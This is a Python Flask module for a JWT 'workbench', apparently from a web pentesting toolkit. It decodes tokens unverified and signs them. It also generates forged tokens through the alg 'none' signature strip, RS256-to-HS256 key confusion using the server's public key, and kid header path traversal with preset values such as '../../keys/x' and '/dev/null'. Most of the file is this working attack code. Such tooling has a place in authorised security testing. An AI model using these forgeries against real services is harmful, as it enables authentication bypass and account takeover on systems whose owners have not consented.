"""JWT workbench — decode, sign, alg-switch, key-confusion, kid traversal."""
from __future__ import annotations

import base64
import json

import jwt as pyjwt
from flask import Blueprint, redirect, render_template, request, url_for

from .._prg import PRGCache
from ...a11y import summarise_jwt

bp = Blueprint("jwt", __name__)

_cache = PRGCache()


HS_ALGS = ["HS256", "HS384", "HS512"]
RS_ALGS = ["RS256", "RS384", "RS512"]
ES_ALGS = ["ES256", "ES384", "ES512"]
ALL_ALGS = HS_ALGS + RS_ALGS + ES_ALGS + ["none"]


_EMPTY_FORM = {
    "token": "", "header_text": "", "payload_text": "",
    "alg": "HS256", "secret": "",
    "private_key": "", "public_key": "",
    "kid_values": "kid1\nkey-1\n../../keys/x\n/dev/null",
}
_EMPTY_OUT = {
    "decoded": None, "summary": "", "signed": "",
    "alg_none": "", "key_confusion": "",
    "kid_set": [], "error": "",
}


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def _decode_unverified(token: str) -> tuple[dict, dict, str, str | None]:
    """Returns (header, payload, signature_b64, error)."""
    try:
        parts = token.strip().split(".")
        if len(parts) < 2:
            return {}, {}, "", "Not a JWT (need at least 2 dots)."
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig = parts[2] if len(parts) > 2 else ""
        return header, payload, sig, None
    except Exception as e:
        return {}, {}, "", f"{type(e).__name__}: {e}"


@bp.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        stashed = _cache.get(request.args.get("t"))
        if stashed:
            return render_template("jwt/index.html",
                                    form=stashed["form"], out=stashed["out"],
                                    algs=ALL_ALGS)
        form = dict(_EMPTY_FORM)
        # Pre-fill token from GET param when arriving via "Send to JWT".
        tok = request.args.get("token", "")
        if tok:
            form["token"] = tok
        return render_template("jwt/index.html", form=form,
                                out=dict(_EMPTY_OUT), algs=ALL_ALGS)

    # POST — do the work, stash, redirect.
    form = dict(_EMPTY_FORM)
    for k in form:
        if k in request.form:
            form[k] = request.form[k]
    out = dict(_EMPTY_OUT)
    out["kid_set"] = []
    action = request.form.get("action", "decode")

    if action == "decode":
        h, p, sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            out["decoded"] = {"header": h, "payload": p, "signature": sig}
            out["summary"] = summarise_jwt(h, p)
            form["header_text"] = json.dumps(h, indent=2)
            form["payload_text"] = json.dumps(p, indent=2)

    elif action == "sign":
        try:
            hdr = json.loads(form["header_text"] or "{}")
            pl = json.loads(form["payload_text"] or "{}")
            alg = form["alg"] or "HS256"
            hdr["alg"] = alg
            if alg == "none":
                enc = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
                enc2 = _b64url_encode(json.dumps(pl, separators=(",", ":")).encode())
                out["signed"] = f"{enc}.{enc2}."
            else:
                key = form["private_key"] if alg.startswith(("RS", "ES")) else form["secret"]
                if not key:
                    out["error"] = "Missing key/secret."
                else:
                    out["signed"] = pyjwt.encode(pl, key, algorithm=alg, headers=hdr)
        except Exception as e:
            out["error"] = f"{type(e).__name__}: {e}"

    elif action == "alg_none":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            h["alg"] = "none"
            enc = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            enc2 = _b64url_encode(json.dumps(p, separators=(",", ":")).encode())
            out["alg_none"] = f"{enc}.{enc2}."

    elif action == "key_confusion":
        # RS256 -> HS256 trick: sign with the server's public key as if it were HMAC secret
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        elif not form["public_key"]:
            out["error"] = "Need the server's public key (PEM) to forge HS256-of-pubkey."
        else:
            try:
                h["alg"] = "HS256"
                forged = pyjwt.encode(p, form["public_key"], algorithm="HS256", headers=h)
                out["key_confusion"] = forged
            except Exception as e:
                out["error"] = f"{type(e).__name__}: {e}"

    elif action == "kid_traversal":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            values = [v for v in (form["kid_values"] or "").splitlines() if v.strip()]
            produced: list[tuple[str, str]] = []
            for kid in values:
                h2 = dict(h); h2["kid"] = kid; h2["alg"] = "HS256"
                try:
                    tok = pyjwt.encode(p, form["secret"] or "secret", algorithm="HS256", headers=h2)
                    produced.append((kid, tok))
                except Exception as e:
                    produced.append((kid, f"<error: {e}>"))
            out["kid_set"] = produced

    token = _cache.put({"form": form, "out": out})
    return redirect(url_for(".index", t=token))
